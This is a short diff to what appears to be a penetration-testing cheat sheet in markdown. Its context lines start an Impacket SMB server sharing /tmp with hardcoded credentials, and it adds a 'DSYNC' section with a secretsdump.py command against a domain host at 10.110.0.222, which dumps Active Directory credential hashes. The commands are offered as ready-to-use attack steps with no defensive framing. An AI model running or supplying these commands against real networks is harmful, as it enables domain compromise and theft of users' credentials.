@@ -18,3 +18,9 @@
 sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123 
 ```
 
+## DSYNC
+
+```csharp
+./secretsdump.py crook.badcorp.local/User:Password@10.110.0.222
+```
+
